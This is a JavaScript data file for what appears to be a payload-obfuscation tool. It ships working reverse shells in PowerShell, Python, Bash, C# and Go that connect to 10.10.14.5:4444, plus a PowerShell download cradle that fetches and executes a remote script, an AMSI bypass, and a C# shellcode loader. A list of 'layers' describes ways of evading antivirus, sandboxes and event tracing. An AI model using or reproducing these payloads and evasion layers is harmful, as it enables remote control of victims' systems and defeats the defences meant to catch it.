/**
 * Obfuscation Techniques Data
 * Defines available layers per language with descriptions and settings.
 */

export const LANGUAGES = [
  {
    id: 'powershell',
    name: 'PowerShell',
    icon: '⚡',
    extension: '.ps1',
    color: '#3b82f6',
    placeholder: `# Paste your PowerShell payload here
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()`,
  },
  {
    id: 'python',
    name: 'Python',
    icon: '🐍',
    extension: '.py',
    color: '#f59e0b',
    placeholder: `# Paste your Python payload here
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`,
  },
  {
    id: 'bash',
    name: 'Bash',
    icon: '🐚',
    extension: '.sh',
    color: '#10b981',
    placeholder: `#!/bin/bash
# Paste your Bash payload here
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`,
  },
  {
    id: 'csharp',
    name: 'C#',
    icon: '🔷',
    extension: '.cs',
    color: '#8b5cf6',
    placeholder: `// Paste your C# payload here
using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class Program {
    static void Main() {
        TcpClient client = new TcpClient("10.10.14.5", 4444);
        Stream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        while (true) {
            string cmd = reader.ReadLine();
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            writer.WriteLine(p.StandardOutput.ReadToEnd());
            writer.Flush();
        }
    }
}`,
  },
  {
    id: 'go',
    name: 'Go',
    icon: '🔹',
    extension: '.go',
    color: '#06b6d4',
    placeholder: `// Paste your Go payload here
package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, _ := net.Dial("tcp", "10.10.14.5:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}`,
  },
]

export const OBFUSCATION_LAYERS = [
  {
    id: 'randomize',
    name: 'Variable Randomization',
    icon: '🎲',
    description: 'Replace variable and function names with random identifiers',
    impact: 'Breaks static signature matching on known variable patterns',
    supported: ['powershell', 'python', 'bash', 'csharp', 'go'],
  },
  {
    id: 'encode',
    name: 'String Encoding',
    icon: '🔐',
    description: 'Encode string literals with Base64, Hex, or char codes',
    impact: 'Hides suspicious strings from pattern-matching scanners',
    supported: ['powershell', 'python', 'bash', 'csharp', 'go'],
  },
  {
    id: 'deadcode',
    name: 'Dead Code Injection',
    icon: '💀',
    description: 'Insert non-functional code to alter control flow graph',
    impact: 'Confuses static analysis and changes code fingerprint',
    supported: ['powershell', 'python', 'bash', 'csharp', 'go'],
  },
  {
    id: 'antianalysis',
    name: 'Anti-Analysis',
    icon: '🛡️',
    description: 'Add sandbox detection, sleep timers, and environment checks',
    impact: 'Evades dynamic analysis and sandbox environments',
    supported: ['powershell', 'python', 'csharp', 'go'],
  },
  {
    id: 'xorstrings',
    name: 'XOR String Encryption',
    icon: '⚔️',
    description: 'Encrypt each string with random XOR key and just-in-time decryption',
    impact: 'Eliminates all plaintext strings — defeats signature & heuristic scanners',
    supported: ['powershell', 'python', 'bash', 'csharp', 'go'],
  },
  {
    id: 'controlflow',
    name: 'Control Flow Flattening',
    icon: '🌀',
    description: 'Flatten code into randomized state-machine switch/while loop',
    impact: 'Defeats CFG analysis, decompiler pattern recognition, and heuristic engines',
    supported: ['powershell', 'csharp', 'go'],
  },
  {
    id: 'amsietw',
    name: 'AMSI/ETW Patch',
    icon: '🧬',
    description: 'Prepend obfuscated AMSI bypass + ETW blind before payload execution',
    impact: 'Disables runtime memory scanning and event tracing on Windows targets',
    supported: ['powershell', 'csharp'],
  },
  {
    id: 'encrypt',
    name: 'Encryption Wrapper',
    icon: '🔒',
    description: 'Wrap entire payload in XOR/AES encryption with runtime decryption',
    impact: 'Completely hides payload structure from static scanners',
    supported: ['powershell', 'python', 'bash', 'csharp', 'go'],
  },
]

export const TEMPLATES = [
  {
    id: 'ps-download-cradle',
    name: 'PowerShell Download Cradle',
    language: 'powershell',
    icon: '📥',
    code: `$url = "http://10.10.14.5/payload.ps1"
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString($url)
IEX($data)`,
  },
  {
    id: 'ps-amsi-bypass',
    name: 'AMSI Bypass Template',
    language: 'powershell',
    icon: '🛡️',
    code: `[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)`,
  },
  {
    id: 'py-reverse-shell',
    name: 'Python Reverse Shell',
    language: 'python',
    icon: '🐍',
    code: `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`,
  },
  {
    id: 'bash-revshell',
    name: 'Bash Reverse Shell',
    language: 'bash',
    icon: '🐚',
    code: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`,
  },
  {
    id: 'cs-shellcode-loader',
    name: 'C# Shellcode Loader Skeleton',
    language: 'csharp',
    icon: '🔷',
    code: `using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    static void Main() {
        // Replace with your shellcode bytes
        byte[] buf = new byte[] { 0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00 };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}`,
  },
  {
    id: 'go-revshell',
    name: 'Go Reverse Shell',
    language: 'go',
    icon: '🔹',
    code: `package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, _ := net.Dial("tcp", "10.10.14.5:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}`,
  },
  {
    id: 'ps-master-v3',
    name: '⚡ Master Payload v3.0 (AMSI + Stealth IEX)',
    language: 'powershell',
    icon: '🏴',
    code: `# Master Payload v3.0 — AMSI Bypass + Stealth IEX + Download Cradle
# Step 1: AMSI Bypass (strings will be auto-obfuscated)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)

# Step 2: Download Cradle with Stealth IEX
$url = "http://10.10.14.5/payload.ps1"
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString($url)
IEX($data)`,
  },
]
